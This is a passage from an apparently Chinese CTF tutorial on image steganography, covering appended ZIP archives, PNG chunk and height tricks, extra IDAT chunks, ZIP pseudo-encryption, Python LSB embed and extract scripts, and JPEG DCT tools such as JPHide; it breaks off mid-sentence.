class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 对图片进行检测，确认是不是图种</span><br><span class="line">- 使用binwalk&#x2F;formost分离图片，得到一个压缩包</span><br><span class="line">- 打开压缩包得到flag。</span><br></pre></td></tr></table></figure><p>简单的检测方式:</p><p>打开工具中的binwalk。使用如下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk cqzb.jpg</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/ksW5dyzS9hJjntE.png" alt="image-20200611162616711"></p><p>我们可以发现，binwalk自动识别出来了zip文件，而且偏移也告诉我们了,当然我们这里可以使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -e &#x2F;root&#x2F;桌面&#x2F;cqzb.jpg</span><br></pre></td></tr></table></figure><p>这个命令可以提取出binwalk检测出来的文件</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/jIsvnfW5R3oiltL.png" alt="image-20200611162954920"></p><p> 但是这里也可以通过另一种方式去提取压缩包，从原理上去提取。这里介绍一个工具<code>winhex16进制编辑器</code>，当然也可以使用其他的16进制编辑器。</p><p><strong>使用winhex16进制编辑器提取ZIP文件</strong></p><p>首先需要了解一下什么是文件头</p><p>文件头就是位于文件开头的一段标识文件类型的数据块</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/UQPuHLDokX84Sth.png" alt="image-20200611213803814"></p><p>如上图的FF D8 FF就是JPG图片的文件头，一般当我们看到文件开头是如此的格式，我们就能认为这是一个JPG图片了。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/fH3NKpulMb2Aaqy.png" alt="image-20200611214620664"></p><p>一般JPG的文件尾以FFD9结尾</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/3FryjsmvewA4Zfx.png" alt="image-20200611214339008"></p><p>上图 50 4B 03 04就是ZIP文件的文件头，一般以PK表示。</p><p>上文我们讲述了，JPG图片的结束标识是FF D9,ZIP文件的文件头是50 4B 03 04，我们只需要在winhex中找到ZIP文件的文件头即可，滑动滚条到最底下。上文讲了一般附加的位置是在原本文件的后面，所以我们果断滑动滚动条到最后。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/rvZlJpfQgFzG7VH.png" alt="image-20200611214741860"></p><p>明显此图不是以FF D9结尾，而且在上面发现了ZIP文件的文件头50 4B 03 04，所以不使用binwalk也能判断这是个图种文件。然后接下来我们就需要分离ZIP文件了。</p><p><strong>分离ZIP文件</strong></p><p>选取从文件头开始到文件尾的所有数据，以16进制数复制到新建的文件中。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/enzkJP9V8q7K3i5.png" alt="image-20200611215154084"></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/18LJvrK2Psy9Wpt.png" alt="image-20200611215317247"></p><p>然后保存就能得到zip文件。</p><hr><h4 id="二、基于文件结构的图片隐写"><a href="#二、基于文件结构的图片隐写" class="headerlink" title="二、基于文件结构的图片隐写"></a>二、基于文件结构的图片隐写</h4><h5 id="背景知识："><a href="#背景知识：" class="headerlink" title="背景知识："></a>背景知识：</h5><p>这里的文件结构特指的是图片文件的文件结构。我们这里主要讲的也是PNG图片的文件结构。CTF比赛中也是以PNG图片的隐写为主。</p><p>PNG文件结构很简单，主要由数据块组成，最少包含4个数据块。</p><p>PNG数据块PNG图片有两种数据块的，一种是关键数据块，另一种是辅助数据块。</p><p>正常的关键数据块，定义了4种标准数据块，分别是<font color=red>长度，数据块类型码，数据块数据，循环冗余检测(CRC )</font>font&gt;，每个PNG文件都必须包含它们。</p><table><thead><tr><th>PNG标识符</th><th>PNG文件头数据块（IHDR）</th><th>PNG数据块</th><th>…</th><th align="left">PNG结尾数据块(IEND)</th></tr></thead><tbody><tr><td>89504E470D0A1A0A</td><td>IHDR中，包括了图片的宽，高，图像深度，颜色类型，压缩方法等等。</td><td>IDAT 数据块、辅助数据块</td><td></td><td align="left">000000004945 4E44AE426082</td></tr></tbody></table><ul><li>PNG标识符<code>89504E470D0A1A0A</code>总是在文件头部，用于标识这是一个PNG图片。</li><li>PNG文件头数据块IHDR，它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</li><li>PNG数据块IDAT，它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</li><li>PNG结束数据块IEND：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</li></ul><p><strong>IHDR数据块构成：</strong></p><table><thead><tr><th><strong>域的名称</strong></th><th><strong>字节数</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>图像宽度，以像素为单位</td></tr><tr><td>Height</td><td>4 bytes</td><td>图像高度，以像素为单位</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>图像深度：  索引彩色图像：1，2，4或8  灰度图像：1，2，4，8或16  真彩色图像：8或16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>颜色类型： 0：灰度图像, 1，2，4，8或16  2：真彩色图像，8或16  3：索引彩色图像，1，2，4或8  4：带α通道数据的灰度图像，8或16  6：带α通道数据的真彩色图像，8或16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>压缩方法(LZ77派生算法)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>滤波器方法</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>隔行扫描方法： 0：非隔行扫描  1： Adam7(由Adam M. Costello开发的7遍隔行扫描方法)</td></tr></tbody></table><p>这里我们需要重点关注的是宽和高的数据</p><p><strong>首先举个例子：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/f2m5RXLUjCukob7.png" alt="image-20200611223017816"></p><p><strong>PNG标识符：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">89504E470D0A1A0A</span><br></pre></td></tr></table></figure><p>表示这是一个PNG文件</p><p><strong>接下来是IHDR数据块</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 0D</span><br><span class="line">&#x2F;&#x2F;表示IHDR头快长度为13(16进制编辑器，D表示13)</span><br><span class="line">49 48 44 52</span><br><span class="line">&#x2F;&#x2F;IHDR标识，表示这是一个IHDR数据块</span><br><span class="line">00 00 03 E8 </span><br><span class="line">&#x2F;&#x2F;表示PNG图像的宽，16^2*3+16^1*14+16^0*8&#x3D;1000像素</span><br><span class="line">00 00 02 32 </span><br><span class="line">&#x2F;&#x2F;表示PNG图像的高，16^2*2+16^1*3+16^0*2&#x3D;562像素</span><br><span class="line">08 </span><br><span class="line">&#x2F;&#x2F;表示图像深度，这里是2^8&#x3D;256，即这是一个256色的图像</span><br><span class="line">06 </span><br><span class="line">&#x2F;&#x2F;颜色类型，查表可知这是带α通道数据的真彩色图像</span><br><span class="line">00</span><br><span class="line">&#x2F;&#x2F;压缩方法</span><br><span class="line">00 </span><br><span class="line">&#x2F;&#x2F;PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法（LZ77派生 算法）</span><br><span class="line">00</span><br><span class="line">&#x2F;&#x2F;滤波器方法</span><br><span class="line">58 71 E0 19</span><br><span class="line">&#x2F;&#x2F;CRC校验</span><br></pre></td></tr></table></figure><p>接下来的是不重要的数据块，我们只需要知道知道再之后就会有IDAT数据块</p><p><strong>IDAT数据块</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/11/szkZJOCmnRvrhfH.png" alt="image-20200611230506506"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 8A</span><br><span class="line">&#x2F;&#x2F;表示IDAT数据块的长度为8A&#x3D;16^1*8+16^0*10&#x3D;138字节</span><br><span class="line">49 44 41 54</span><br><span class="line">&#x2F;&#x2F;IDAT数据块标识符,表示这是一个IDAT数据块</span><br><span class="line">接下去的数据是真正的数据</span><br><span class="line">D9 CF A5 A8 </span><br><span class="line">&#x2F;&#x2F;CRC校验码</span><br></pre></td></tr></table></figure><h5 id="常用工具："><a href="#常用工具：" class="headerlink" title="常用工具："></a>常用工具：</h5><ul><li>winhex</li><li>010Editor</li><li>pngcheck</li><li>binwalk</li></ul><p><strong>基于文件结构的图片隐写分类：</strong></p><ul><li>高度被修改引起的隐写</li><li>隐写信息以IDAT块加入图片</li></ul><h5 id="A-高度被修改引起的隐写"><a href="#A-高度被修改引起的隐写" class="headerlink" title="A.高度被修改引起的隐写"></a>A.高度被修改引起的隐写</h5><p>背景知识中，我们了解到，图片的高度，宽度的值存放于PNG图片的IHDR数据块，那么我们就是可以通过修改PNG图片的高度值，来对部分信息进行隐藏的。</p><p><strong>解法：</strong></p><p>使用winhex或010Editor等16进制编辑器修改图片高度，调大一点</p><p><strong>技巧：</strong></p><p>一般的高度修改的图片不会修改IHDR的CRC校验码，在windows下，不会检查CRC校验码，图片能正常显示，但在Linux下，图片查看器会检查图片的CRC校验码，所以可以将图片拖入到Linux中去查看校验</p><p>当然可能会把CRC校验码也重新计算过，就不能用这种方法了。</p><p>这里介绍一款工具，能计算CRC校验码：</p><p><strong>CRC Calculator</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/ANukZKTzxjcHeYX.png" alt="image-20200612133558161"></p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 正如前文所说，我们这个实验部分讲的是图片高度值被修改引起的的隐写方式，所以我们winhex</span><br><span class="line">- 在winhex运行PNG图片，这样方便于我们修改PNG图片的高度值</span><br><span class="line">- 找到PNG图片高度值对应的地方，然后修改为一个较大的值，并保存文件</span><br><span class="line">- 打开保存后的图片，发现底部看到了之前被隐写的信息</span><br></pre></td></tr></table></figure><p>原图：<img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612132510439.png" alt="image-20200612132510439"></p><p>修改高度</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612132547621.png" alt="image-20200612132547621"></p><p>修改为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 02 FF</span><br></pre></td></tr></table></figure><p>得到flag：</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612132759250.png" alt="image-20200612132759250"></p><p><strong>思考：</strong></p><ol><li>如果修改的是宽度该怎么修复呢？                  ————————–通过爆破未被修改的CRC校验码得到原始宽度</li><li>JPG图片是否也有这样的隐写形式呢？</li><li>了解JPG以及GIF等图片文件的格式。</li></ol><h5 id="B-隐写信息以IDAT块加入图片"><a href="#B-隐写信息以IDAT块加入图片" class="headerlink" title="B.隐写信息以IDAT块加入图片"></a>B.隐写信息以IDAT块加入图片</h5><p>在背景知识中，我们提到了一个重要的概念就是图片的IDAT块是可以存在多个的，这导致了我们可以将隐写信息以IDAT块的形式加入图片。</p><p>这里再次提一下IDAT数据块的格式：</p><table><thead><tr><th align="left">IDAT数据块长度</th><th align="left">IDAT数据块标识</th><th align="left">IDAT数据</th><th align="left">CRC校验码</th></tr></thead><tbody><tr><td align="left">00 00 00 B3</td><td align="left">49 44 41 54</td><td align="left">50 4B …….00 00</td><td align="left">24 9B 7C 31</td></tr></tbody></table><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612135623777.png" alt="image-20200612135623777"></p><p><strong>解法：</strong></p><p>首先可以通过<code>pngcheck</code>检测是否有异常的数据块，一般的IDAT数据块都是连续的数据块。</p><p>然后查看偏移量找到数据块的位置，提取IDAT数据块进行分析</p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 使用pngcheck先对图片检测</span><br><span class="line">- 在pngcheck的检测下，我们会发现异常信息，我们对异常的块进行提取</span><br><span class="line">- 查看数据块偏移量，找到IDAT数据块</span><br><span class="line">- 提取数据块</span><br><span class="line">- 分析数据块</span><br></pre></td></tr></table></figure><p><strong>前景知识</strong><br>pngcheck可以验证PNG图片的完整性（通过检查内部CRC-32校验和&bra;比特&ket;)和解压缩图像数据；它能够转储几乎所有任选的块级别信息在该图像中的可读数据。<br>我们使用<code>pngcheck -v xxx.png</code>如此的命令对图片进行检测</p><p><strong>使用pngcheck对图片进行检测</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/3HJW2Zj9ScwreLn.png" alt="image-20200612141052876"></p><p>可以发现原本连续的数据块都是32768的大小，然后15871，然后后面还有一个179大小的数据块，说明这个数据块有异常。</p><p><strong>提取数据块</strong></p><p>将数据块内容复制粘贴到新的文件中</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/GJOfTlxgCrLqt6V.png" alt="image-20200612141345571"></p><p><strong>分析数据块：</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/A5eu2Hsc7n3NwEg.png" alt="image-20200612141439513"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">50 4B 03 04</span><br></pre></td></tr></table></figure><p>说明这是一个ZIP压缩包，改后缀名得到zip文件</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/ZEBcTWJiazyG9qV.png" alt="image-20200612141914384"></p><p>发现提示需要密码，由于题目没有更多信息提示，所以先检查ZIP文件格式，查看压缩包是否是伪加密</p><p>提示：伪加密的压缩包可以用360压缩打开，也可以修复压缩包的方法打开或者修改数据；</p><p>伪加密是通过将第二个14后面的00 00 修改为14 00 09实现，只要将09修改成00就能破解，具体原理可以搜索zip伪加密实现</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612143639110.png" alt="image-20200612143639110"></p><p><em>思考</em></p><ol><li>我们是否可以将一张二维码以IDAT块的形式写入图片呢？</li><li>试着自己将信息以IDAT块的形式写入图片—————–需要添加长度和CRC校验</li></ol><hr><h4 id="三、基于LSB原理的图片隐写"><a href="#三、基于LSB原理的图片隐写" class="headerlink" title="三、基于LSB原理的图片隐写"></a>三、基于LSB原理的图片隐写</h4><h5 id="背景知识-1"><a href="#背景知识-1" class="headerlink" title="背景知识"></a>背景知识</h5><p>网络上有很多博文抄来抄去也写的不清楚，然后我也找了很久才搞懂。</p><p>LSB，最低有效位。我们知道图像像素一般是由RGB三原色（即红绿蓝）组成的，每一种颜色占用8位，0x00~0xFF，即一共有256种颜色，一共包含了256的3次方的颜色，颜色太多，而人的肉眼能区分的只有其中一小部分，这导致了当我们修改RGB颜色分量中最低的二进制位的时候，我们的肉眼是区分不出来的</p><p>三原色，每种颜色占8位</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0   0   0   0   |   0   0   0   0</span><br><span class="line">2^7      ...........        2^1 2^0</span><br><span class="line">&#x2F;&#x2F;一原色就一共有2^8&#x3D;256种颜色，三原色就是256^3种颜色</span><br><span class="line">当我们修改每种颜色的最低位二进制位2^0时，我们的肉眼区分不出来，所以就可以通过修改最低位达到隐写数据的目的</span><br></pre></td></tr></table></figure><p><strong>出题思路：</strong></p><ul><li>可以通过对某一颜色的某一个二进制位进行存储0或1 ，存储成这一通道(即二进制位)的黑白图片</li><li>可以在三个颜色通道的最低有效位存储0或1数据，存入图片数据或者其他数据</li></ul><h5 id="常用工具：-1"><a href="#常用工具：-1" class="headerlink" title="常用工具："></a>常用工具：</h5><ul><li>Stegosolve</li></ul><p><strong>Stegosolve介绍</strong><br>CTF中，最常用来检测LSB隐写痕迹的工具是Stegsolve，这是一款可以对图片进行多种操作的工具，包括对图片进行xor,sub等操作，对图片不同通道进行查看等功能。</p><p><strong>基于LSB原理的图片隐写</strong></p><ul><li>简单的LSB隐写</li><li>有一点难度的LSB隐写</li></ul><h5 id="A-简单的LSB隐写"><a href="#A-简单的LSB隐写" class="headerlink" title="A.简单的LSB隐写"></a>A.简单的LSB隐写</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 使用Stegsolve打开图片，在不同的通道查看图片</span><br><span class="line">- 在通道切换的过程中，我们看到了flag</span><br><span class="line">- 最后的flag是flag:key&#123;forensics_is_fun&#125;</span><br></pre></td></tr></table></figure><p>用Stegsolve打开图片，并在不同的通道中切换</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200612150014122.png" alt="image-20200612150014122"></p><p>最后在发现Red的2^0位上隐写了数据</p><p>flag是flag:key{forensics_is_fun}</p><p><strong>思考</strong></p><ol><li>我们如何实现这种LSB隐写的？是否可以通过photoshop这样的工具实现？</li><li>查阅更多关于LSB隐写的资料。</li></ol><h5 id="B-有一点难度的LSB隐写"><a href="#B-有一点难度的LSB隐写" class="headerlink" title="B.有一点难度的LSB隐写"></a>B.有一点难度的LSB隐写</h5><p>我们从第一个部分可以知道，最简单的隐写我们只需要通过工具Stegsolve切换到不同通道，我们就可以直接看到隐写内容了，那么更复杂一点就不是这么直接了，而是只能用工具来查看LSB的隐写痕迹，再通过工具或者脚本的方式提取隐写信息。</p><p>可以通过Stegsolve来查看最低有效位数据：</p><p>也可以进行导出</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Analyse中的Data Extract模块</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/k9tZ23uTpOe8Qma.png" alt="image-20200612154608945"></p><p><strong>python脚本实现最低有效位隐藏算法：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">from PIL import Image</span><br><span class="line">def plus(str):</span><br><span class="line">      #Python zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。</span><br><span class="line">    return str.zfill(8) </span><br><span class="line">def get_key(strr):</span><br><span class="line">      #获取要隐藏的文件内容</span><br><span class="line">    tmp &#x3D; strr</span><br><span class="line">    f &#x3D; file(tmp,&quot;rb&quot;)</span><br><span class="line">    str &#x3D; &quot;&quot;</span><br><span class="line">    s &#x3D; f.read()</span><br><span class="line">    for i in range(len(s)):</span><br><span class="line">         #逐个字节将要隐藏的文件内容转换为二进制，并拼接起来</span><br><span class="line">         #1.先用ord()函数将s的内容逐个转换为ascii码</span><br><span class="line">         #2.使用bin()函数将十进制的ascii码转换为二进制</span><br><span class="line">         #3.由于bin()函数转换二进制后，二进制字符串的前面会有&quot;0b&quot;来表示这个字符串是二进制形式，所以用replace()替换为空</span><br><span class="line">         #4.又由于ascii码转换二进制后是七位，而正常情况下每个字符由8位二进制组成，所以使用自定义函数plus将其填充为8位</span><br><span class="line">        str &#x3D; str+plus(bin(ord(s[i])).replace(&#39;0b&#39;,&#39;&#39;))</span><br><span class="line">        #print str</span><br><span class="line">    f.closed</span><br><span class="line">    return str</span><br><span class="line">def mod(x,y):</span><br><span class="line">    return x%y;</span><br><span class="line">#str1为载体图片路径，str2为隐写文件，str3为加密图片保存的路径</span><br><span class="line">def func(str1,str2,str3):  </span><br><span class="line">    im &#x3D; Image.open(str1)</span><br><span class="line">    #获取图片的宽和高</span><br><span class="line">    width &#x3D; im.size[0]</span><br><span class="line">    print &quot;width:&quot;+str(width)+&quot;\n&quot;</span><br><span class="line">    height &#x3D; im.size[1]</span><br><span class="line">    print &quot;height:&quot;+str(height)+&quot;\n&quot;</span><br><span class="line">    count &#x3D; 0</span><br><span class="line">    #获取需要隐藏的信息</span><br><span class="line">    key &#x3D; get_key(str2)</span><br><span class="line">    keylen &#x3D; len(key)</span><br><span class="line">    for h in range(0,height):</span><br><span class="line">        for w in range(0,width):</span><br><span class="line">            pixel &#x3D; im.getpixel((w,h))</span><br><span class="line">            a&#x3D;pixel[0]</span><br><span class="line">            b&#x3D;pixel[1]</span><br><span class="line">            c&#x3D;pixel[2]</span><br><span class="line">            if count &#x3D;&#x3D; keylen:</span><br><span class="line">                break</span><br><span class="line">            #下面的操作是将信息隐藏进去</span><br><span class="line">            #分别将每个像素点的RGB值余2，这样可以去掉最低位的值</span><br><span class="line">            #再从需要隐藏的信息中取出一位，转换为整型</span><br><span class="line">            #两值相加，就把信息隐藏起来了</span><br><span class="line">            a&#x3D; a-mod(a,2)+int(key[count])</span><br><span class="line">            count+&#x3D;1</span><br><span class="line">            if count &#x3D;&#x3D; keylen:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">                break</span><br><span class="line">            b &#x3D;b-mod(b,2)+int(key[count])</span><br><span class="line">            count+&#x3D;1</span><br><span class="line">            if count &#x3D;&#x3D; keylen:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">                break</span><br><span class="line">            c&#x3D; c-mod(c,2)+int(key[count])</span><br><span class="line">            count+&#x3D;1</span><br><span class="line">            if count &#x3D;&#x3D; keylen:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">                break</span><br><span class="line">            if count % 3 &#x3D;&#x3D; 0:</span><br><span class="line">                im.putpixel((w,h),(a,b,c))</span><br><span class="line">    im.save(str3)</span><br><span class="line">#原图</span><br><span class="line">old &#x3D; &quot;C:\Users\yiming\Desktop\heetian.png&quot;</span><br><span class="line">#处理后输出的图片路径</span><br><span class="line">new &#x3D; &quot;C:\Users\yiming\Desktop\heetian_LSB.png&quot;</span><br><span class="line">#需要隐藏的信息</span><br><span class="line">enc &#x3D; &quot;C:\Users\yiming\Desktop\flag.txt&quot;</span><br><span class="line">func(old,enc,new)</span><br></pre></td></tr></table></figure><p><strong>python最低有效位提取脚本</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding:UTF-8 -*-</span><br><span class="line">from PIL import Image</span><br><span class="line">def mod(x,y):</span><br><span class="line">    return x%y;</span><br><span class="line">def toasc(strr):</span><br><span class="line">    return int(strr, 2)</span><br><span class="line">#le为所要提取的信息的长度，str1为加密载体图片的路径，str2为提取文件的保存路径</span><br><span class="line">def func(le,str1,str2):</span><br><span class="line">    a&#x3D;&quot;&quot;</span><br><span class="line">    b&#x3D;&quot;&quot;</span><br><span class="line">    im &#x3D; Image.open(str1)</span><br><span class="line">    lenth &#x3D; le*8</span><br><span class="line">    width &#x3D; im.size[0]</span><br><span class="line">    height &#x3D; im.size[1]</span><br><span class="line">    count &#x3D; 0</span><br><span class="line">    for h in range(0, height):</span><br><span class="line">        for w in range(0, width):</span><br><span class="line">             #获得(w,h)点像素的值</span><br><span class="line">            pixel &#x3D; im.getpixel((w, h))</span><br><span class="line">            #此处余3，依次从R、G、B三个颜色通道获得最低位的隐藏信息</span><br><span class="line">            if count%3&#x3D;&#x3D;0:</span><br><span class="line">                count+&#x3D;1</span><br><span class="line">                b&#x3D;b+str((mod(int(pixel[0]),2)))</span><br><span class="line">                if count &#x3D;&#x3D;lenth:</span><br><span class="line">                    break</span><br><span class="line">            if count%3&#x3D;&#x3D;1:</span><br><span class="line">                count+&#x3D;1</span><br><span class="line">                b&#x3D;b+str((mod(int(pixel[1]),2)))</span><br><span class="line">                if count &#x3D;&#x3D;lenth:</span><br><span class="line">                    break</span><br><span class="line">            if count%3&#x3D;&#x3D;2:</span><br><span class="line">                count+&#x3D;1</span><br><span class="line">                b&#x3D;b+str((mod(int(pixel[2]),2)))</span><br><span class="line">                if count &#x3D;&#x3D;lenth:</span><br><span class="line">                    break</span><br><span class="line">        if count &#x3D;&#x3D; lenth:</span><br><span class="line">            break</span><br><span class="line">    with open(str2,&quot;wb&quot;) as f:</span><br><span class="line">        for i in range(0,len(b),8):</span><br><span class="line">             #以每8位为一组二进制，转换为十进制</span><br><span class="line">            stra &#x3D; toasc(b[i:i+8])</span><br><span class="line">            #将转换后的十进制数视为ascii码，再转换为字符串写入到文件中</span><br><span class="line">            f.write(chr(stra))</span><br><span class="line">            stra &#x3D;&quot;&quot;</span><br><span class="line">    f.closed</span><br><span class="line">#文件长度</span><br><span class="line">le &#x3D; 30</span><br><span class="line">#含有隐藏信息的图片</span><br><span class="line">new &#x3D; &quot;C:\Users\lenovo\Desktop\LSB\demo2\heetian_LSB.png&quot;</span><br><span class="line">#信息提取出后所存放的文件</span><br><span class="line">tiqu &#x3D; &quot;C:\Users\lenovo\Desktop\LSB\demo2\get_flag.txt&quot;</span><br><span class="line">func(le,new,tiqu)</span><br></pre></td></tr></table></figure><p>可以在图片中隐藏字符串，也可以在图片中隐藏图片</p><p><strong>实验：</strong></p><p><strong>思考</strong></p><ol><li>我们这里用的LSB隐均对R,G,B，三种颜色都加以修改是否可以只修改一个颜色？</li><li>参考2016 HCTF的官方Writeup学习如何实现将一个文件以LSB的形式加以隐写。</li></ol><hr><h4 id="四、基于DCT域的JPG图片隐写"><a href="#四、基于DCT域的JPG图片隐写" class="headerlink" title="四、基于DCT域的JPG图片隐写"></a>四、基于DCT域的JPG图片隐写</h4><p>这个基于DCT域的JPG图片隐写原理太难，没必要搞懂原理，知道有哪几个类型的题目和解法就行。</p><h5 id="背景知识-2"><a href="#背景知识-2" class="headerlink" title="背景知识"></a>背景知识</h5><p>JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种有损压缩（Loss Compression）技术，但一般不会影响图像的视觉效果。</p><p><strong>基于DCT域的JPG图片隐写分类：</strong></p><ul><li>JPHide</li><li>JSteg</li><li>Outguess</li><li>F5等</li></ul><h5 id="常用工具：-2"><a href="#常用工具：-2" class="headerlink" title="常用工具："></a>常用工具：</h5><ul><li>Stegdetect</li><li>JPHS</li><li>Jsteg</li><li>Outguess</li></ul><h5 id="A-JPhide隐写—jpg隐写"><a href="#A-JPhide隐写—jpg隐写" class="headerlink" title="A.JPhide隐写—jpg隐写"></a>A.JPhide隐写—jpg隐写</h5><p><strong>隐写原理</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Jphide是基于最低有效位LSB的JPEG格式图像隐写算法，使用JPEG图像作为载体是因为相比其他图像格式更不容易发现隐藏信息，因为JPEG图像在DCT变换域上进行隐藏比空间域隐藏更难检测，并且鲁棒性更强，同时Blowfish算法有较强的抗统计检测能力。</span><br><span class="line">由于JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像，而这个图像压缩方法的核心是：通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数，并使用近似估算法降低其冗余度。因此，我们可以把DCT看作一个用于执行压缩的近似计算方法。因为丢失了部分数据，所以DCT是一种有损压缩（Loss Compression）技术，但一般不会影响图像的视觉效果。</span><br></pre></td></tr></table></figure><p><strong>隐写过程</strong></p><p>JPhide隐写过程大致为：</p><ul><li>先解压压缩JPEG图像，得到DCT系数；</li><li>然后对隐藏信息用户给定的密码进行Blowfish加密；</li><li>再利用Blowfish算法生成伪随机序列，并据此找到需要改变的DCT系数，将其末位变为需要隐藏的信息的值。最后把DCT系数重新压回成JPEG图片；</li></ul><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/c8BWkE1KjvA76Pu.png" alt="img"></p><p><strong>隐写实现</strong></p><p>1.Stegdetect<br>实现JPEG图像JPhide隐写算法工具有多个，比如由Neils Provos开发通过统计分析技术评估JPEG文件的DCT频率系数的隐写工具 Stegdetect，它可以检测到通过<font color=red>JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage</font>等这些隐写工具隐藏的信息，并且还具有基于字典暴力破解密码方法提取通过JPhide、outguess和jsteg-shell方式嵌入的隐藏信息。<br>2.JPHS<br>另一款JPEG图像的信息隐藏软件JPHS，它是由Allan Latham开发设计实现在Windows和Linux系统平台针对有损压缩JPEG文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序JPHIDE和JPSEEK， JPHIDE程序主要是实现将信息文件加密隐藏到JPEG图像功能，而JPSEEK程序主要实现从用JPHIDE程序加密隐藏得到的JPEG图像探测提取信息文件，Windows版本的JPHS里的JPHSWIN程序具有图形化操作界面且具备JPHIDE和JPSEEK的功能。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/HDcyNhuowI7dSJF.png" alt="img"></p><p>2.分别准备一个JPEG格式的图片（example.jpg）和一个文本文件（flag.txt）。</p><p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。<br>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 